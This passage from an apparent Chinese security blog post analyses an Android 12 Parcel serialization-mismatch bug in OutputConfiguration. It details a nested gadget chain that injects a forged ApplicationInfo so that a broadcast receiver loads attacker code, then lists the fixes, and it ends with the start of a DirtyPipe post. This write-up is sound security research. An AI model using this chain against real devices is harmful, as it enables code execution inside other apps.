<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> p.readInt(); <span class="comment">// a = 1</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> p.readString(); <span class="comment">// b = &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是，<code>Parcel</code>内部保存着读取的位置。<code>Parcel</code>类的使用者应当确保<code>read*</code>方法与之前使用的<code>write*</code>方法相匹配，否则后续的读取操作将来自缓冲区中的错误位置。</strong></p>
<p><code>Parcel</code>还支持自定义<code>object</code>，通过<code>Parcelable</code>接口来实现。</p>
<p>实现<code>Parcelable</code>接口需要实现接口中的两个方法：</p>
<ol>
<li><code>public int describeContents();</code>，内容接口描述，默认返回0即可；</li>
<li><code>public void writeToParcel(Parcel dest, int flags);</code>，将对象序列化成一个Parcel对象。</li>
</ol>
<p>然后，还需要实例化静态内部对象<code>CREATOR</code>来实现<code>Parcelable.Creator</code>，实现<code>CREATOR</code>时要实现其中的方法：</p>
<ol>
<li><code>createFromParcel</code>，从Parcel中读取前面序列化的对象。</li>
</ol>
<p>下面是一个实现该接口的例子（<code>WindowContainerTransaction</code>类被用作exp gadget利用链中的一部分）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.window;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">WindowContainerTransaction</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;IBinder, Change&gt; mChanges = <span class="keyword">new</span> <span class="title class_">ArrayMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;HierarchyOp&gt; mHierarchyOps = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">WindowContainerTransaction</span><span class="params">(Parcel in)</span> &#123;</span><br><span class="line">        in.readMap(mChanges, <span class="literal">null</span> <span class="comment">/* loader */</span>);</span><br><span class="line">        in.readList(mHierarchyOps, <span class="literal">null</span> <span class="comment">/* loader */</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeToParcel</span><span class="params">(<span class="meta">@NonNull</span> Parcel dest, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">        dest.writeMap(mChanges);</span><br><span class="line">        dest.writeList(mHierarchyOps);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Creator&lt;WindowContainerTransaction&gt; CREATOR =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Creator</span>&lt;WindowContainerTransaction&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> WindowContainerTransaction <span class="title function_">createFromParcel</span><span class="params">(Parcel in)</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WindowContainerTransaction</span>(in);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示，在写的时候调用<code>writeToParcel()</code>函数，在读的时候调用<code>CREATOR.createFromParcel()</code>函数。<code>Parcelable</code>接口的实现需要确保<code>createFromParcel()</code>函数读取的数据与<code>writeToParcel()</code>函数写入的数据一致，否则后续的读取将要出错。</p>
<p>这样的类可以通过以下方式读取&#x2F;写入<code>Parcel</code>：</p>
<ul>
<li>直接调用 <code>obj.writeToParcel(parcel, 0)</code> &#x2F; <code>obj = WindowContainerTransaction.CREATOR.createFromParcel()</code>，这经常用于类是已知的，比如，当<code>Parcelable</code>拥有不同的<code>Parcelable</code>字段，或者当定义RPC方法时由AIDL生成的包含以<code>Parcelable</code>为参数的代码。</li>
<li>通过 <code>Parcel.writeParcelable</code>&#x2F;<code>readParcelable</code>。<code>writeParcelable</code>首先写入类的名称，然后调用<code>Parcelable</code>接口的<code>writeToParcel</code>方法。<code>readParcelable</code>读取写入的类的名称，在提供的<code>ClassLoader</code>或<code>BOOTCLASSPATH</code>（提供的参数为null）中查找该类名。一旦找到该类，则通过其静态字段<code>CREATOR</code>获取<code>Parcelable.Creator</code>实例（被用于读取这个类）<em>。另外， 当使用<code>readParcelable</code>方法时，它可以读取类路径中的任何<code>Parcelable</code>，因为要创建的对象的名称是从同一个<code>Parcel</code>中读取的。</em><ul>
<li><code>readParcelable</code>被许多其他的<code>Parcel</code>方法所使用，例如上面的例子中看到的<code>readList</code>通过<code>readValue</code>读取元素，这是<code>Parcel</code>中最通用的传输对象的方法，它使用的方式之一就是通过<code>readParcelable</code>。在上面的例子中，由于Java的类型清除，<code>ArrayList&lt;HierarchyOp&gt; mHierarchyOps</code>字段实际上可以包含<code>Parcel</code>支持的任何对象，而不仅仅是那些与通用类型声明中指定的类型兼容的对象。</li>
</ul>
</li>
</ul>
<h2 id="BroadcastReceiver"><a href="#BroadcastReceiver" class="headerlink" title="BroadcastReceiver"></a>BroadcastReceiver</h2><p>从开发者角度来看，<code>BroadcastReceiver</code> 的工作方式如下：应用程序调用<code>sendBroadcast</code> 发送广播，当广播的Intent与 <code>AndroidManifest.xml</code>中定义的 <code>&lt;receiver&gt;</code> 匹配上以后，系统将启动接收该广播的应用程序， 将<code>&lt;receiver android:name&gt;</code>属性中定义的<code>BroadcastReceiver</code>子类实例化，然后调用<code>onReceive</code>方法。</p>
<p>接收广播的过程中与<code>system_server</code>发生的通信：</p>
<ol>
<li>当应用进程开始启动时，将调用<code>IActivityManager.attachApplication()</code>，通过这样，传递<code>ApplicationThread</code>句柄，系统用这个句柄来告诉应用进程要做什么。</li>
<li>当系统想在应用进程中执行清单中注册的<code>BroadcastReceiver</code>时，它使用上面提到的<code>IApplicationThread</code>调用<code>scheduleReceiver</code>方法。这个方法有多个参数，但这里最重要的是前两个：<ol>
<li><code>Intent intent</code>，在调用<code>sendBroadcast()</code>时传递给系统的。</li>
<li><code>ActivityInfo info</code>，它包含了要执行的组件的信息。这个参数的值是由系统从包管理器服务中获取的。最重要的是，在这个参数中传递的数据包括处理收到的广播的Java类的文件路径。</li>
</ol>
</li>
</ol>
<p><strong>利用路径：调用<code>sendBroadcast()</code>，传递一个<code>Intent</code>，这将导致导致调用<code>scheduleReceiver</code>的应用程序接收到一个被篡改的<code>ActivityInfo</code>。</strong></p>
<p><strong>需要注意的是，这种新的利用途径在Android 12中变得可行</strong>，因为以前没有办法在<code>Intent</code>中放入任意的<code>Parcelable</code>（<code>Intent</code>的<code>extra</code>不算，因为它们被放入<code>Bundle</code>中，<code>Bundle</code>的整个长度被写入<code>Parcel</code>中，并作为单个<code>blob</code>被读取，所以<code>extra</code>不会导致它们包含的<code>Intent</code>对象解析出错）。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="writeToParcel-createFromParcel"><a href="#writeToParcel-createFromParcel" class="headerlink" title="writeToParcel&#x2F;createFromParcel"></a>writeToParcel&#x2F;createFromParcel</h2><p>如上所述，<code>Parcelable</code>接口的实现需要确保<code>createFromParcel()</code>函数读取的数据与<code>writeToParcel()</code>函数写入的数据一致。每当<code>BOOTCLASSPATH</code>中存在一个可以违反该约定的<code>Parcelable</code>时，就会产生一个漏洞，因为可能导致以下情况的发生：</p>
<ol>
<li>恶意应用程序向<code>system_server</code>发送一个<code>Bundle</code> 或<code>Parcelable</code>，其中包含有问题的<code>Parcelable</code>实例以及专门构建的数据，这些数据将在步骤3中读取，但在步骤2中传递。</li>
<li><code>system_server</code>验证<code>Bundle</code>是安全的，然后转发，或者<code>system_server</code>将提供的<code>Parcelable</code>传递给AIDL方法，该方法的下一个参数中也有关键数据（如果该参数中收到的数据可能被修改，将导致安全问题）。</li>
<li>另一个应用程序从<code>system_server</code>接收数据并信任它，但由于错误的序列化，它实际看到的数据与<code>system_server</code>打算发送的数据不同。</li>
</ol>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>大多数时候，<code>writeToParcel</code>&#x2F;<code>createFromParcel</code>不匹配的情况是，在这些方法中的一个字段被遗忘或写了两次，在这种情况下，发送这样的对象总是会触发不匹配。</p>
<p>接下来看看有漏洞的类（<a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/hardware/camera2/params/OutputConfiguration.java;drc=46c390a1c695e2dc458cb889e40559f259f60aed">源码</a>如下，标有<code>//</code>的代码是手动添加的，因为在作者写writeup时它们还不在AOSP中）（这里是最初<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/a69b1bc58b0838e06deefb190e226774a34671e6%5E%21/#F10">引入漏洞的提交</a>，但它是在Android 12发布后发布的）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.hardware.camera2.params;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">OutputConfiguration</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">OutputConfiguration</span><span class="params">(<span class="meta">@NonNull</span> Parcel source)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rotation</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">surfaceSetId</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">surfaceType</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDeferred</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isShared</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;Surface&gt; surfaces = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Surface&gt;();</span><br><span class="line">        source.readTypedList(surfaces, Surface.CREATOR);</span><br><span class="line">        <span class="type">String</span> <span class="variable">physicalCameraId</span> <span class="operator">=</span> source.readString();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isMultiResolution</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>; <span class="comment">// New in Android 12</span></span><br><span class="line">        ArrayList&lt;Integer&gt; sensorPixelModesUsed = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(); <span class="comment">// New in Android 12</span></span><br><span class="line">        source.readList(sensorPixelModesUsed, Integer.class.getClassLoader()); <span class="comment">// New in Android 12</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// SNIP: copy values from variables set above to fields of this class</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="meta">@android</span>.annotation.NonNull Parcelable.Creator&lt;OutputConfiguration&gt; CREATOR =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Parcelable</span>.Creator&lt;OutputConfiguration&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputConfiguration <span class="title function_">createFromParcel</span><span class="params">(Parcel source)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">OutputConfiguration</span> <span class="variable">outputConfiguration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputConfiguration</span>(source);</span><br><span class="line">                <span class="keyword">return</span> outputConfiguration;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.e(TAG, <span class="string">&quot;Exception creating OutputConfiguration from parcel&quot;</span>, e);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputConfiguration[] newArray(<span class="type">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OutputConfiguration</span>[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeToParcel</span><span class="params">(Parcel dest, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dest == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;dest must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest.writeInt(mRotation);</span><br><span class="line">        dest.writeInt(mSurfaceGroupId);</span><br><span class="line">        dest.writeInt(mSurfaceType);</span><br><span class="line">        dest.writeInt(mConfiguredSize.getWidth());</span><br><span class="line">        dest.writeInt(mConfiguredSize.getHeight());</span><br><span class="line">        dest.writeInt(mIsDeferredConfig ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        dest.writeInt(mIsShared ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        dest.writeTypedList(mSurfaces);</span><br><span class="line">        dest.writeString(mPhysicalCameraId);</span><br><span class="line">        dest.writeInt(mIsMultiResolution ? <span class="number">1</span> : <span class="number">0</span>); <span class="comment">// New in Android 12</span></span><br><span class="line">        dest.writeList(mSensorPixelModesUsed); <span class="comment">// New in Android 12</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Surface&gt; mSurfaces;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mRotation;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mSurfaceGroupId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mSurfaceType;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Size mConfiguredSize;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredFormat;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredDataspace;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredGenerationId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> mIsDeferredConfig;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsShared;</span><br><span class="line">    <span class="keyword">private</span> String mPhysicalCameraId;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsMultiResolution; <span class="comment">// New in Android 12</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; mSensorPixelModesUsed; <span class="comment">// New in Android 12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如前面讨论<code>WindowContainerTransaction</code>例子时所说，<code>readList</code>实际上可以用<code>Parcel</code>支持的任何对象来填充列表，而不仅仅是符合通用声明的对象（<code>ArrayList&lt;Integer&gt;</code>）。然而，由于我们只是将这个类作为序列化小工具链的一部分，而不是真正使用它，除了读写<code>Parcel</code>，这个字段不会被用于其他任何事情（而使用<code>ArrayList</code>中的元素，而这些元素与它的泛型声明不匹配，无论如何都只会导致<code>ClassCastException</code>）。</p>
<p>在这个类中，<code>createFromParcel</code>中也有一个<code>try-catch</code>，这意味着如果在读取过程中抛出一个异常，对<code>OutputConfiguration</code>的读取将被停止，对包含<code>OutputConfiguration</code>的对象的读取将继续进行。当这种情况发生时，整个<code>OutputConfiguration</code>将被写入<code>Parcel</code>，但它将<strong>只被读到异常发生的点</strong>。这就造成了不匹配。</p>
<p>为了构建这样的<code>Parcelable</code>，现在需要找到一些东西放在<code>mSensorPixelModesUsed</code>中，在<code>system_server</code>中成功读取（因为这个对象是通过<code>Parcel</code>从攻击者应用中接收的），在<code>system_server</code>中成功写入，然后在受害者应用中解析<code>Parcel</code>失败并抛出一个<code>Exception</code>。</p>
<p>其中一个方法是使用存在于<code>system_server</code>中但不在应用程序中的类，这样尝试反序列化它就会导致<code>ClassNotFoundException</code>。但是不能从<code>system_server</code>中<code>Parcelable</code>，因为<code>readParcelable</code>没有明确指定<code>ClassLoader</code>只会搜索<code>BOOTCLASSPATH</code>（<code>BOOTCLASSPATH</code>不包含<code>system_server</code>中特定的类）。解决方法是使用一个可序列化的类，因为<code>ObjectInputStream</code>会从堆栈中第一个非<code>BOOTCLASSPATH</code>方法中挑选<code>ClassLoader</code>。</p>
<p>这里选择<code>PackageManagerException</code>，然而在使用它之前，还需要做一件事。在<code>OutputConfiguration</code>构造函数中，当<code>readList</code>被调用时，参数<code>loader</code>被明确设置为<code>Integer.class.getClassLoader()</code>。<code>loader</code>被传播到<code>readValue()</code>，然后到<code>readSerializable()</code>，如果<code>loader</code>不为空的，它就会被用来代替来自<code>ObjectInputStream</code>的<code>resolveClass</code>（<code>c != null</code>检查没有任何作用，因为当<code>Class.forName</code>没有找到类时，它会抛出异常而不是返回空）。</p>
<p><strong>思路是将<code>PackageManagerException</code>包裹在一些<code>Parcelable</code>中，在不指定<code>ClassLoader</code>的情况下进行<code>readList</code>。</strong></p>
<p>因此有以下对象：</p>
<ul>
<li><code>OutputConfiguration</code><ul>
<li><code>mSensorPixelModesUsed.get(0) = WindowContainerTransaction</code><ul>
<li><code>mHierarchyOps.get(0) = PackageManagerException</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>现在这样的对象可以在<code>system_server</code>中成功反序列化：当<code>WindowContainerTransaction</code>调用<code>readList</code>时，它会尝试使用<code>system_server</code>的<code>ClassLoader</code>（不是<code>BootClassLoader</code>）找到<code>PackageManagerException</code>类，因为它可以在堆栈跟踪中找到它。该类加载器恰好出现在堆栈跟踪中，但以下所有方法都不在<code>system_server</code>类路径中：<code>Binder#execTransact()</code>、AIDL生成的<code>IActivityManager$Stub#onTransact()</code>以及所有使用的<code>Parcelable</code>类的方法，但在堆栈跟踪中，有一个在<code>system_server</code>中声明的方法：在<code>ActivityManagerService</code>中重写的<code>onTransact</code>。因此，<code>system_server</code>可以读取并随后将这样的对象写入<code>Parcel</code>，当目标应用程序试图读取它时，<code>PackageManagerException</code>类将不可用，因此<code>ClassNotFoundException</code>将被抛出，被包装成<code>RuntimeException</code>，然后被<code>OutputConfiguration</code>的 <code>CREATOR</code>捕获。</p>
<p>但是还没有触发<strong>不匹配</strong>，因为<code>OutputConfiguration.writeToParcel</code>没有留下任何未读数据时，异常被捕获了，但是可以很容易地在<code>mSensorPixelModesUsed</code>列表中添加另一个项目，该项目将通过<code>Parcel.writeValue</code>写入，并在读取<code>OutputConfiguration</code>后留下未读数据。</p>
<p><strong>从Intent对象中触发</strong></p>
<p>因为它将被<code>system_server</code>传递到AIDL方法中，该方法的第一个参数是<code>Intent</code>，第二个参数是执行信息，所以第一个参数中传递的<code>Intent</code>的序列化&#x2F;反序列化会导致第二个参数中的值被改变。</p>
<p>在<code>Intent.readFromParcel()</code>中，所有的值都是通过专门的类型方法来读取的，所以在这里不能指定自定义的<code>Parcelable</code>类。</p>
<p>在<code>Intent</code>中，有一个嵌套的<code>ClipData</code>，并且从Android 12开始，在<code>ClipData$Item</code>中有一个新的字段<code>ActivityInfo mActivityInfo</code>。（这里是引入这个字段的<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/c932060175133e266233f1c7667dc69470fbc62e%5E%21/#F2">提交</a>，这个字段是在<code>ClipData(Parcel in)</code>构造函数中通过<code>in.readTypedObject(ActivityInfo.CREATOR)</code>读取的）</p>
<p>然后在<code>ActivityInfo(Parcel source)</code>构造函数中，也没有办法放入自定义的<code>Parcelable</code>，但是由于<code>ActivityInfo</code>是从<code>ComponentInfo</code>扩展而来，它有<code>applicationInfo</code>字段。</p>
<p>最后，在 <code>ApplicationInfo</code> 中有一个<code> SparseArray&lt;int[]&gt; splitDependencies</code> 字段，它是通过<code> readSparseArray</code> 读取的，而后者又使用 <code>readValue</code> 来读取 <code>SparseArray</code> 项目。</p>
<p>可以将<code>OutputConfiguration</code>放在<code>splitDependencies</code>中，但是读取<code>splitDependencies</code>之后会有一些<code>readString8()</code>的调用，而且在发生不匹配之后，最好能完全控制未被接受的数据，这样我们就可以直接将空字符串放在那里，而不用担心未被接受的数据的不同解释。</p>
<p>要做到这一点，首先需要在<code>OutputConfiguration.mSensorPixelModesUsed</code>中放置一些原始数据，这些数据将通过<code>writeValue</code>写入。这里选择使用<code>Bundle</code>。这样，在未消耗的数据中，会留下：</p>
<ol>
<li><code>writeValue VAL_BUNDLE</code>标签</li>
<li>原始数据的长度（此链接也适用于此列表中的其余项目）</li>
<li><code>BUNDLE_MAGIC</code></li>
<li>通过<code>Parcel.appendFrom</code>逐字传递的原始数据</li>
</ol>
<p>所以我们有三个<code>Parcel.writeInt</code>的项目没有消耗掉，我们可以通过将<code>OutputConfiguration</code>包裹在一些<code>Parcelable</code>中，在读取时读取任意的<code>Parcelable</code>值和三个<code>ints</code>，来摆脱它们。<code>ZenPolicy CREATOR</code>中存在这样的方法。</p>
<p>最后，我们有以下对象的层次结构（存在于<code>system_server</code>中，并且它试图传递给<code>scheduleReceiver</code>）：</p>
<ul>
<li><code>Intent</code><ul>
<li><code>mClipData = ClipData</code><ul>
<li><code>mItems.get(0).mActivityInfo = ActivityInfo</code><ul>
<li><code>applicationInfo = ApplicationInfo</code><ul>
<li><code>splitDependencies.get(0) = ZenPolicy</code><ul>
<li><code>mVisualEffects.get(0) = OutputConfiguration</code><ul>
<li><code>mSensorPixelModesUsed.get(0) = WindowContainerTransaction</code><ul>
<li><code>mHierarchyOps.get(0) = PackageManagerException</code></li>
</ul>
</li>
<li><code>mSensorPixelModesUsed.get(1) = Bundle</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>这是由<code>system_server</code>写的。然后，接收应用程序正常读取<code>PackageManagerException</code>的所有数据（包括<code>readSerializable</code>数据），然而在读取<code>PackageManagerException</code>的<code>Serializable</code>数据后，一个异常被抛出，并且取消了对<code>OutputConfiguration</code>以下所有数据的读取，留下<code>Bundle</code>未读。读取继续进行到<code>ZenPolicy</code>，它消耗了<code>Bundle</code>中原始数据之前的三个<code>ints</code>。然后<code>ApplicationInfo</code>的读取继续进行，读取的数据是之前在<code>Bundle</code>中逐字传递的原始数据。对原始数据的读取将在这个堆栈中的其他对象（<code>ApplicationInfo</code>、<code>ActivityInfo</code>、<code>ClipData</code>和<code>Intent</code>）中继续进行，然后这些原始数据将被用于读取下一个<code>handleReceiver</code>方法参数。</p>
<p><strong>handleReceiver</strong></p>
<p>正如刚才所说，现在剩下的<code>scheduleReceiver</code>参数是从攻击者控制的缓冲区中读取的。首先，<code>scheduleReceiver</code>将所有参数的值打包并使用<code>sendMessage()</code>将执行传递给主线程。接下来，在主线程上调用<code>handleReceiver</code>，<code>handleReceiver</code>调用<code>getPackageInfoNoCheck</code>，将其作为<code>ActivityInfo</code>的一部分传递给<code>scheduleReceiver</code>参数的<code>ApplicationInfo</code>。</p>
<p><code>getPackageInfo</code>检查给定名称的包是否已经存在于缓存中，如果没有，则构建新的<code>LoadedApk</code>实例，将先前收到的<code>ApplicationInfo</code>对象传递给它。（由于想要创建新的<code>LoadedApk</code>，所以在这个过程中使用了先前没有看到的包的包名）</p>
<p>然后使用<code>ContextImpl.getClassLoader()</code>方法，该方法首先委托给<code>mPackageInfo.getClassLoader()</code>，<code>mPackageInfo</code>是在上一段构建的<code>LoadedApk</code>。</p>
<p>然后是&#96;&#96;createOrUpdateClassLoaderLocked<code>，它调用</code>makePaths<code>将</code>ClassLoader<code>中要使用的路径填充到</code>zipPaths<code>中，然后将它们连接起来并分配给zip变量，再传递给</code>createClassLoader&#96;。</p>
<p><code>makePaths</code>使用<code>ApplicationInfo</code>的信息填充<code>zipPaths</code>，最重要的是，这包括<code>sourceDir</code>。攻击者应用程序使注入的<code>ApplicationInfo</code>与<code>sourceDir</code>设置为自己的<code>apk</code>的路径，因此<code>receiver</code>类将实际从攻击者<code>apk</code>中加载。这直接导致了在接收广播的应用程序中执行攻击者控制的代码。</p>
<p><strong>隐藏的API检查</strong></p>
<p>还有一件事需要被绕过：隐藏的API检查。但这些不是问题（因为应用程序可以使用NDK，并直接调用底层系统调用），但在这种情况下，通过手动将数据写入<code>Parcel</code>，然后使用<code>readParcelable</code>来构建精心制作的<code>ClipData</code>来绕过它们。这样的<code>ClipData</code>通常可以被附在<code>Intent上</code>，然后传递给<code>sendBroadcast()</code>，因此发送广播本身只需使用公共API即可完成。</p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>Android 12发布：</p>
<ul>
<li>从<code>OutputConfiguration</code>和相关类中删除了异常捕获功能。</li>
<li><code>OutputConfiguration#mSensorPixelModesUsed</code>不再通过<code>writeValue</code>写入。</li>
<li><code>ClipData#mActivityInfo</code>不再被写入<code>Parcel</code>，除非在写入过程中明确要求（因此<code>Intent</code>不再包含来自<code>BOOTCLASSPATH</code>的任意<code>Parcelables</code>，消除了这种利用技术）。</li>
</ul>
<p>在写这篇文章时，只出现在主分支上，不在发布的版本中，可能会出现在Android 13中（不在12L中）：</p>
<ul>
<li>在<code>Parcel</code>上有新的List读取方法，可以检查元素的类型，没有类型的版本已经被标记为废弃。</li>
<li>新的方法<code>Parcel#enforceNoDataAvail()</code>，检查<code>Parcel</code>中是否有未读的数据，显然AIDL在读取RPC调用参数后会使用这个方法。</li>
<li>在<code>Bundle</code>中的每个项目都将单独保存其长度。这几乎扼杀了整个bug类。</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-28T11:33:20.000Z" title="2022/3/28 19:33:20">2022-03-28</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-17T04:42:45.663Z" title="2022/4/17 12:42:45">2022-04-17</time></span><span class="level-item">26 minutes read (About 3825 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/">DirtyPipe-Android利用</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。</p>
<p>该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。</p>
